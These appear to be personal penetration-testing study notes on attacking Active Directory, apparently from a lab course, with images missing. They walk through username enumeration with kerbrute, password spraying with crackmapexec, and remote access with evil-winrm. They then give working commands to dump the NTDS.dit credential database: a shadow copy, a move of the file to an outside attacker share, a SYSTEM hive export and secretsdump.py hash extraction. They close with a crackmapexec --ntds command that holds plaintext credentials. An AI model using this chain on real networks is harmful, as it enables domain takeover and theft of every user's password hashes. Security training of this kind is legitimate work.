# Attacking Active Directory & NTDS.dit

to get hashes from ntds.dit file we need system hive also which means bootkey. but get sam and security hives also if possible

`automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats

#### we can check username with kerbrute

![[images/image 9.png]]

[https://g0dl3v3l.com/user-enumeration-using-kerbrute-tool-5154a252f6a4](https://g0dl3v3l.com/user-enumeration-using-kerbrute-tool-5154a252f6a4)

### After that crack password with CME (crackmapexec)

![[images/image 10.png]]
### Once you get creds, connect via evil-winrm

Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.

## we need to have one of two group rights

### Administrator Local Group

![[images/image 11.png]]
part of Administrator group

### **Checking User Account Privileges including Domain group**

![[images/image 12.png]]
Part of domain group


We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights. We also will want to check what domain privileges we have.

## Two ways to dump ntds.dit file

### dump with shadow copy

```powershell
vssadmin CREATE SHADOW /For=C:
```

### move to our kali


```powershell
cmd.exe /c move \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit \\10.10.14.199\ROPNOP
```


```powershell
reg.exe save hklm\system C:\Users\jmarston\Documents\system.save
```

![[images/image 13.png]]
process to transfer ntds.dit file

### Get hash with secretsdump.py


```bash
python3 /opt/impacket/examples/secretsdump.py -ntds ntds.dit -system system.save -hashes lmhash:nthash LOCAL
```


we need system hive for this
![[images/image 14.png]]
https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277

### Faster way CME (crackmapexec)

```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

we can dump ntds hashes with it

![[images/image 15.png]]
